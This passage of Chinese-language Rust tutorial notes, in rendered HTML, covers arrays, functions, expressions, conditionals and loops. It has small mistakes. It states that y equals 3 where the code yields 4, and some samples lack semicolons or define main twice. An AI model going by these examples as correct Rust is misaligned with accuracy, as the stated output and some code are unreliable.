</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#note-cs-rust-rust-__codelineno-8-5"></a><span class="kd">let</span><span class="w"> </span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="w"> </span><span class="n">y</span><span class="p">,</span><span class="w"> </span><span class="n">z</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tup</span><span class="p">;</span>
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#note-cs-rust-rust-__codelineno-8-6"></a><span class="c1">// y 等于 6.4</span>
</span></code></pre></div></p>
</li>
<li>
<p>数组<code>[]</code>,同类型数据
<div class="language-rust highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#note-cs-rust-rust-__codelineno-9-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">];</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#note-cs-rust-rust-__codelineno-9-2"></a><span class="c1">// a 是一个长度为 5 的整型数组</span>
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#note-cs-rust-rust-__codelineno-9-3"></a>
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#note-cs-rust-rust-__codelineno-9-4"></a><span class="kd">let</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s">&quot;January&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;February&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;March&quot;</span><span class="p">];</span>
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#note-cs-rust-rust-__codelineno-9-5"></a><span class="c1">// b 是一个长度为 3 的字符串数组</span>
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#note-cs-rust-rust-__codelineno-9-6"></a>
</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#note-cs-rust-rust-__codelineno-9-7"></a><span class="kd">let</span><span class="w"> </span><span class="n">c</span>: <span class="p">[</span><span class="kt">i32</span><span class="p">;</span><span class="w"> </span><span class="mi">5</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">];</span>
</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#note-cs-rust-rust-__codelineno-9-8"></a><span class="c1">// c 是一个长度为 5 的 i32 数组</span>
</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#note-cs-rust-rust-__codelineno-9-9"></a>
</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#note-cs-rust-rust-__codelineno-9-10"></a><span class="kd">let</span><span class="w"> </span><span class="n">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mi">3</span><span class="p">;</span><span class="w"> </span><span class="mi">5</span><span class="p">];</span>
</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#note-cs-rust-rust-__codelineno-9-11"></a><span class="c1">// 等同于 let d = [3, 3, 3, 3, 3];</span>
</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#note-cs-rust-rust-__codelineno-9-12"></a>
</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#note-cs-rust-rust-__codelineno-9-13"></a><span class="kd">let</span><span class="w"> </span><span class="n">first</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#note-cs-rust-rust-__codelineno-9-14"></a><span class="kd">let</span><span class="w"> </span><span class="n">second</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#note-cs-rust-rust-__codelineno-9-15"></a><span class="c1">// 数组访问</span>
</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#note-cs-rust-rust-__codelineno-9-16"></a>
</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#note-cs-rust-rust-__codelineno-9-17"></a><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">123</span><span class="p">;</span><span class="w"> </span><span class="c1">// 错误：数组 a 不可变</span>
</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18" href="#note-cs-rust-rust-__codelineno-9-18"></a><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">];</span>
</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19" href="#note-cs-rust-rust-__codelineno-9-19"></a><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span><span class="w"> </span><span class="c1">// 正确</span>
</span></code></pre></div></p>
</li>
</ul>
<h2 id="note-cs-rust-rust-_5">函数<a class="headerlink" href="#note-cs-rust-rust-_5" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-rust-rust-_6">基本结构<a class="headerlink" href="#note-cs-rust-rust-_6" title="Permanent link">&para;</a></h3>
<p>rust函数的结构和C语言类似,其基本结构为</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#note-cs-rust-rust-__codelineno-10-1"></a><span class="k">fn</span> <span class="o">&lt;</span><span class="err">函数名</span><span class="o">&gt;</span><span class="p">(</span><span class="o">&lt;</span><span class="err">参数</span><span class="o">&gt;</span><span class="p">)</span><span class="o">&lt;</span><span class="err">函数体</span><span class="o">&gt;</span>
</span></code></pre></div>
<p>用到的函数需要在main函数里面调用，但是并不需要在调用之前出现</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#note-cs-rust-rust-__codelineno-11-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#note-cs-rust-rust-__codelineno-11-2"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Hello, world!&quot;</span><span class="p">);</span>
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#note-cs-rust-rust-__codelineno-11-3"></a><span class="w">    </span><span class="n">another_function</span><span class="p">();</span>
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#note-cs-rust-rust-__codelineno-11-4"></a><span class="p">}</span>
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#note-cs-rust-rust-__codelineno-11-5"></a><span class="k">fn</span> <span class="nf">another_function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#note-cs-rust-rust-__codelineno-11-6"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Hello, runoob!&quot;</span><span class="p">);</span>
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#note-cs-rust-rust-__codelineno-11-7"></a><span class="p">}</span>
</span></code></pre></div>
</div>
<h3 id="note-cs-rust-rust-_7">函数参数<a class="headerlink" href="#note-cs-rust-rust-_7" title="Permanent link">&para;</a></h3>
<p>Rust 中定义函数如果需要具备参数必须声明参数名称和类型：</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#note-cs-rust-rust-__codelineno-12-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#note-cs-rust-rust-__codelineno-12-2"></a><span class="w">    </span><span class="n">another_function</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">);</span>
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#note-cs-rust-rust-__codelineno-12-3"></a><span class="p">}</span>
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#note-cs-rust-rust-__codelineno-12-4"></a>
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#note-cs-rust-rust-__codelineno-12-5"></a><span class="k">fn</span> <span class="nf">another_function</span><span class="p">(</span><span class="n">x</span>: <span class="kt">i32</span><span class="p">,</span><span class="w"> </span><span class="n">y</span>: <span class="kt">i32</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#note-cs-rust-rust-__codelineno-12-6"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;x 的值为 : {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">x</span><span class="p">);</span>
</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#note-cs-rust-rust-__codelineno-12-7"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;y 的值为 : {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">y</span><span class="p">);</span>
</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#note-cs-rust-rust-__codelineno-12-8"></a><span class="p">}</span>
</span></code></pre></div>
运行结果
<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#note-cs-rust-rust-__codelineno-13-1"></a>x 的值为 : 5
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#note-cs-rust-rust-__codelineno-13-2"></a>y 的值为 : 6
</span></code></pre></div></p>
</div>
<h3 id="note-cs-rust-rust-_8">函数体的语句和表达式<a class="headerlink" href="#note-cs-rust-rust-_8" title="Permanent link">&para;</a></h3>
<p>Rust 函数体由一系列可以  以表达式（Expression）结尾 （在这里断句） 的语句（Statement）组成。</p>
<p>语句是执行某些操作且没有返回值的步骤。例如：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#note-cs-rust-rust-__codelineno-14-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">6</span><span class="p">;</span><span class="c1">//没有返回值</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#note-cs-rust-rust-__codelineno-14-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">b</span><span class="o">=</span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">6</span><span class="p">;)</span><span class="c1">//语句不正确</span>
</span></code></pre></div>
表达式有计算步骤且有返回值</p>
<p>在Rust 中可以在一个用 <code>{}</code>包括的块里编写一个较为复杂的表达式：</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#note-cs-rust-rust-__codelineno-15-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#note-cs-rust-rust-__codelineno-15-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">5</span><span class="p">;</span>
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#note-cs-rust-rust-__codelineno-15-3"></a>
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#note-cs-rust-rust-__codelineno-15-4"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#note-cs-rust-rust-__codelineno-15-5"></a><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="p">;</span>
</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#note-cs-rust-rust-__codelineno-15-6"></a><span class="w">        </span><span class="n">x</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="c1">//可以理解为局部变量</span>
</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#note-cs-rust-rust-__codelineno-15-7"></a><span class="w">    </span><span class="p">};</span><span class="c1">//和y=连在一起是一条语句</span>
</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#note-cs-rust-rust-__codelineno-15-8"></a>
</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#note-cs-rust-rust-__codelineno-15-9"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;x 的值为 : {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">x</span><span class="p">);</span>
</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#note-cs-rust-rust-__codelineno-15-10"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;y 的值为 : {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">y</span><span class="p">);</span>
</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#note-cs-rust-rust-__codelineno-15-11"></a><span class="p">}</span>
</span></code></pre></div>
最后x的值为5，y的值为3</p>
<p>这段程序中包括了一个表达式块，在块中可以使用函数语句，最后一个步骤是表达式，此表达式的结果值是整个表达式块所代表的值。这种表达式块叫做函数体表达式。</p>
<div class="admonition danger">
<p class="admonition-title">Danger</p>
<p><code>x + 1</code> 之后没有分号，否则它将变成一条语句！</p>
</div>
<h3 id="note-cs-rust-rust-_9">返回值<a class="headerlink" href="#note-cs-rust-rust-_9" title="Permanent link">&para;</a></h3>
<p>不同于C语言，RUST函数既可以嵌套使用也可以嵌套定义</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#note-cs-rust-rust-__codelineno-16-1"></a><span class="w">   </span><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#note-cs-rust-rust-__codelineno-16-2"></a><span class="w">    </span><span class="k">fn</span> <span class="nf">five</span><span class="p">()</span><span class="w"> </span>-&gt; <span class="kt">i32</span> <span class="p">{</span>
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#note-cs-rust-rust-__codelineno-16-3"></a><span class="w">        </span><span class="mi">5</span><span class="c1">//表达式，不能加分号</span>
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#note-cs-rust-rust-__codelineno-16-4"></a><span class="w">    </span><span class="p">}</span><span class="c1">//用{}来创建一个作用域,不用分号</span>
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#note-cs-rust-rust-__codelineno-16-5"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;five() 的值为: {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">five</span><span class="p">());</span>
</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#note-cs-rust-rust-__codelineno-16-6"></a><span class="w">   </span><span class="p">}</span>
</span></code></pre></div>
<p>上面的例子中，在main函数里面定义了一个<code>five()</code>，返回类型使用<code>-&gt;</code>在参数声明之后指明，不是<code>:</code>,在函数体中，随时都可以以 return 关键字结束函数运行并返回一个类型合适的值。这也是最接近大多数开发者经验的做法：</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#note-cs-rust-rust-__codelineno-17-1"></a><span class="k">fn</span> <span class="nf">add</span><span class="p">(</span><span class="n">a</span>: <span class="kt">i32</span><span class="p">,</span><span class="w"> </span><span class="n">b</span>: <span class="kt">i32</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="kt">i32</span> <span class="p">{</span>
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#note-cs-rust-rust-__codelineno-17-2"></a><span class="k">return</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">b</span><span class="p">;</span>
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#note-cs-rust-rust-__codelineno-17-3"></a><span class="p">}</span>
</span></code></pre></div>
</div>
<div class="admonition danger">
<p class="admonition-title">Danger</p>
<p>注意：函数体表达式并不能等同于函数体，它不能使用 return 关键字。</p>
</div>
<h2 id="note-cs-rust-rust-_10">条件语句<a class="headerlink" href="#note-cs-rust-rust-_10" title="Permanent link">&para;</a></h2>
<p>RUST中的条件语句与C语言类似
例如
<div class="language-rust highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#note-cs-rust-rust-__codelineno-18-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">num</span><span class="o">=</span><span class="mi">3</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#note-cs-rust-rust-__codelineno-18-2"></a><span class="k">if</span><span class="w"> </span><span class="n">num</span><span class="o">&lt;</span><span class="mi">5</span>
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#note-cs-rust-rust-__codelineno-18-3"></a><span class="p">{</span>
</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#note-cs-rust-rust-__codelineno-18-4"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;less than five&quot;</span><span class="p">)</span>
</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#note-cs-rust-rust-__codelineno-18-5"></a><span class="p">}</span>
</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#note-cs-rust-rust-__codelineno-18-6"></a><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">num</span><span class="o">==</span><span class="mi">5</span><span class="p">{</span>
</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#note-cs-rust-rust-__codelineno-18-7"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;equal to five&quot;</span><span class="p">)</span>
</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#note-cs-rust-rust-__codelineno-18-8"></a><span class="p">}</span>
</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#note-cs-rust-rust-__codelineno-18-9"></a><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#note-cs-rust-rust-__codelineno-18-10"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;bigger than five&quot;</span><span class="p">)</span>
</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#note-cs-rust-rust-__codelineno-18-11"></a><span class="p">}</span>
</span></code></pre></div>
但是有几点需要注意</p>
<ul>
<li>条件表达式不需要用<code>()</code>括起来,注意是不需要而不是不允许</li>
<li>RUST中的<code>if</code>语句不存在单句不用<code>{}</code>的规则，一个块还是需要括起来的</li>
<li>RUST中的条件表达式必须是bool类型的，不允许像C中允许的非零即可判断为真，例如下面的程序是非法的
<div class="language-rust highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#note-cs-rust-rust-__codelineno-19-1"></a><span class="w">  </span><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#note-cs-rust-rust-__codelineno-19-2"></a><span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="n">number</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#note-cs-rust-rust-__codelineno-19-3"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="n">number</span><span class="w"> </span><span class="p">{</span><span class="w">   </span><span class="c1">// 报错，expected `bool`, found integerrustc(E0308)</span>
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#note-cs-rust-rust-__codelineno-19-4"></a><span class="w">      </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Yes&quot;</span><span class="p">);</span>
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#note-cs-rust-rust-__codelineno-19-5"></a><span class="w">  </span><span class="p">}</span><span class="w"> </span>
</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#note-cs-rust-rust-__codelineno-19-6"></a><span class="w">  </span><span class="p">}</span>
</span></code></pre></div></li>
</ul>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#note-cs-rust-rust-__codelineno-20-1"></a><span class="k">if</span><span class="w"> </span><span class="o">&lt;</span><span class="n">condition</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">block</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">block</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="p">}</span>
</span></code></pre></div>
这种结构下的block也可以是函数体表达式
用法例如
<div class="language-rust highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#note-cs-rust-rust-__codelineno-21-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">a</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#note-cs-rust-rust-__codelineno-21-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">num</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="p">{</span><span class="mi">1</span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="o">-</span><span class="mi">1</span><span class="p">};</span>
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#note-cs-rust-rust-__codelineno-21-3"></a><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;number 为 {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">num</span><span class="p">);</span>
</span></code></pre></div>
这样就实现了三元运算表达式<code>A?B:C</code>的效果</p>
</div>
<h2 id="note-cs-rust-rust-_11">循环<a class="headerlink" href="#note-cs-rust-rust-_11" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-rust-rust-while">while循环<a class="headerlink" href="#note-cs-rust-rust-while" title="Permanent link">&para;</a></h3>
<p>例如
<div class="language-rust highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#note-cs-rust-rust-__codelineno-22-1"></a><span class="k">while</span><span class="w"> </span><span class="n">i</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">{</span>
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#note-cs-rust-rust-__codelineno-22-2"></a><span class="w">    </span><span class="n">i</span><span class="o">=</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#note-cs-rust-rust-__codelineno-22-3"></a><span class="p">}</span>
</span></code></pre></div></p>
<h3 id="note-cs-rust-rust-for">for循环<a class="headerlink" href="#note-cs-rust-rust-for" title="Permanent link">&para;</a></h3>
<p>跟C语言的for循环相比，rust语言的for循环更加类似于python</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#note-cs-rust-rust-__codelineno-23-1"></a><span class="w">   </span><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#note-cs-rust-rust-__codelineno-23-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mi">10</span><span class="p">,</span><span class="w"> </span><span class="mi">20</span><span class="p">,</span><span class="w"> </span><span class="mi">30</span><span class="p">,</span><span class="w"> </span><span class="mi">40</span><span class="p">,</span><span class="w"> </span><span class="mi">50</span><span class="p">];</span><span class="w"> </span>
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#note-cs-rust-rust-__codelineno-23-3"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">iter</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//a.iter() 代表 a 的迭代器（iterator）</span>
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#note-cs-rust-rust-__codelineno-23-4"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;值为 : {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">);</span><span class="w"> </span>
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#note-cs-rust-rust-__codelineno-23-5"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span>
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#note-cs-rust-rust-__codelineno-23-6"></a><span class="w">   </span><span class="p">}</span>
</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#note-cs-rust-rust-__codelineno-23-7"></a><span class="w">   </span><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#note-cs-rust-rust-__codelineno-23-8"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mi">10</span><span class="p">,</span><span class="w"> </span><span class="mi">20</span><span class="p">,</span><span class="w"> </span><span class="mi">30</span><span class="p">,</span><span class="w"> </span><span class="mi">40</span><span class="p">,</span><span class="w"> </span><span class="mi">50</span><span class="p">];</span><span class="w"> </span>
</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#note-cs-rust-rust-__codelineno-23-9"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">5</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//0..5的用法相当于range(0,5)</span>
</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#note-cs-rust-rust-__codelineno-23-10"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;a[{}] = {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span><span class="w"> </span>
</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#note-cs-rust-rust-__codelineno-23-11"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span>
